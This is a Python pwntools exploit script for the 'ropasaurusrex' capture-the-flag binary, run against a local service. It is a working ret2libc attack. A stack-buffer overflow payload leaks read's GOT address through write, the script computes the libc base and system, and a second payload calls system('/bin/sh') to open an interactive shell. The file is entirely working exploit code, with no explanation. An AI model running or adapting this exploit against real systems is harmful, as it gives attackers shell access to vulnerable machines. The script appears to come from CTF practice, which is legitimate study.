from pwn import *

#io = process("./ropasaurusrex")
io = remote('127.0.0.1',9998)
elf = ELF("./ropasaurusrex")
lib = ELF("/lib/i386-linux-gnu/libc.so.6")

func_overflow = 0x80483f4
#sub_80483F4
bof = 0x80483f4

payload = 'a'*(0x88+4)
payload += p32(elf.symbols['write'])
payload += p32(func_overflow)
payload += p32(1)
payload += p32(elf.got['read'])
payload += p32(4)


io.sendline(payload)

read_address = u32(io.recv(4))
base = read_address - lib.symbols['read']
system_address = base + lib.symbols['system']
print "[*]system address is : "+  str( hex(system_address))

payload = ''
payload += 'a'*(0x88+4)
payload += p32(system_address)
payload += 'aaaa'
payload += p32(base + next(lib.search('/bin/sh')))

io.send(payload)

io.interactive()





